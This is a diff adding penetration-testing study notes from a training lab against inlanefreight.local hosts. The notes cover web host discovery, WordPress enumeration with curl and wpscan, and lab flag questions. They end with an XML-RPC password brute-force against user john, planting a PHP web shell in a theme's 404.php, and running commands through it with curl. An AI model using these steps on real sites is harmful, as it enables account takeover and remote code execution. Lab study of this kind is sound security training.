@@ -723,3 +723,65 @@ echo $PATH
 cat web_discovery.xml | ./aquatone -nmap
 >> interpreting the result 
 noting down interesting hosts urls,app name verison,...
+
+
+=======================
+
+cat << EOF > scopeList
+> app.inlanefreight.local
+dev.inlanefreight.local
+drupal-dev.inlanefreight.local
+drupal-qa.inlanefreight.local
+drupal-acc.inlanefreight.local
+drupal.inlanefreight.local
+blog.inlanefreight.local
+> EOF
+
+sudo nmap STMIP -p 80,443,8000,8080,8180,8888,10000 --open -oA webDiscovery -iL scopeList
+python3 EyeWitness.py --web -x ~/web_discovery.xml -d inlanefreight_eyewitness
+cat webDiscovery.xml | aquatone -nmap
+---------------------
+wordpress discovery 
+/robots.txt  /wp-admin  /wp-content   /wp-login.php
+-plugins in the wp-content/plugins   /wp-content/themes
+enumerate
+$curl -s http://blog.inlanefreight.local | grep wordpress
+$curl -s http://blog.inlanefreight.local/ | grep themes
+$curl -s http://blog.inlanefreight.local/ | grep plugins
+Browsing to http://blog.inlanefreight.local/wp-content/plugins/mail-masta/
+curl -s http://blog.inlanefreight.local/?p=1 | grep plugins
+-------------------
+enum user
+/wp-login
+--------
+WPS-scan
+sudo gem install wpscan
+https://wpvulndb.com/
+ just create an account and copy the API token from the users page. This token can then be supplied to wpscan using the --api-token parameter.
+ sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token dEOFB<SNIP>
+
+From the data we gathered manually and using WPScan, we now know the following:
+
+The site is running WordPress core version 5.8, which does suffer from some vulnerabilities that do not seem interesting at this point
+The installed theme is Transport Gravity
+The following plugins are in use: Contact Form 7, mail-masta, wpDiscuz
+The wpDiscuz version is 7.0.4, which suffers from an unauthenticated remote code execution vulnerability
+The mail-masta version is 1.0.0, which suffers from a Local File Inclusion vulnerability as well as SQL injection
+The WordPress site is vulnerable to user enumeration, and the users admin and john are confirmed to be valid users
+Directory listing is enabled throughout the site, which may lead to sensitive data exposure
+XML-RPC is enabled, which can be leveraged to perform a password brute-forcing attack against the login page using WPScan, Metasploit, etc.
+
+-----------------------
+"Enumerate the host and find a flag.txt flag in an accessible directory."
+sudo wpscan --url http://blog.inlanefreight.local --enumerate
+
+"Find the version number of this plugin"
+http://blog.inlanefreight.local/wp-content/plugins/wp-sitemap-page/
+-----------
+attacking wordpress
+sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
+Click on Select after selecting the theme, and we can edit an uncommon page such as 404.php to add a web shell.
+system($_GET[0]);
+add to edit them modify source  > update > located at /wp-content/themes/<theme name>
+curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
+-https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/
